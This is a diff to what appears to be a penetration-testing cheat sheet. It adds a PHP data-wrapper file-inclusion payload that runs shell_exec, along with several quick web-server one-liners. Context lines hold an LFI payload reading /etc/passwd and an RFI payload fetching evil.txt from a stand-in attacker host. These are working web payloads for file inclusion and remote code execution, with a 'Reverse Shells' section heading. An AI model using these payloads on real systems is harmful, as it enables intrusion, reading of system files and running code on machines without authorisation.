@@ -222,6 +222,8 @@ MySQL
 ## File inclusion
 - LFI: http://target.com/?page=home --> http://target.com/?page=./../../../../../../../../../etc/passwd%00
 - RFI: http://target.com/?page=home --> http://target.com/?page=http://hackerip/evil.txt%00
+- With LFI, data wrappers can be used:
+  `http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>`  
 
 ## Reverse Shells
 Linux:
@@ -446,7 +448,11 @@ If you have path traversal plus a location with write access you can exploit tha
 - `rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.10.10.10`  
 
 ## start webserver
-- `python -m SimpleHTTPServer 80`
+- `python -m SimpleHTTPServer 80`  
+- `python3 -m http.server 7331`  
+- `php -S 0.0.0.0:8000`  
+- `ruby -run -e httpd . -p 9000`  
+- `busybox httpd -f -p 10000`  
 
 ## start FTP server
 - Install pyftpdlib  
